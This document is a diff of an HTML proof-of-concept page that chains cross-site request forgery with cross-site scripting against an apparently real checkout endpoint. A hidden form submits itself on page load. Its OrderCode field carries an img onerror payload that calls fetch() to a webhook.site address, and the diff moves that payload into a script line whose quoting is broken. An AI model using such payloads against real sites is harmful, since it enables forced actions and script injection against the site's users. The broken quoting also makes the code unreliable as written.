@@ -7,12 +7,13 @@
 <body>
   <form id="csrfForm" action="https://www.familyhomeplans.com/checkout/review.cfm" method="POST">
     <!-- These hidden inputs replicate exactly what the legitimate form sends -->
-    <input type="hidden" name="OrderCode"   value="%22%3E%3Cimg%20src=x%20onerror=%22(async%20function()%7Bawait%20fetch('https://webhook.site/8fee246c-1fd8-4c73-a3b1-0090f7157873');%7D)()%22%3E%22%3E">
+    <input id="OrderCode" type="hidden" name="OrderCode"   value="">
     <input type="hidden" name="PromoCode"   value="">
     <input type="hidden" name="saveordercode" value="1">
   </form>
 
   <script>
+    document.getElementById('OrderCode').value = ""><img src=x onerror="(async function(){await fetch('https://webhook.site/8fee246c-1fd8-4c73-a3b1-0090f7157873');})()">";
     // Immediately submit when the page loads
     document.getElementById('csrfForm').submit();
   </script>
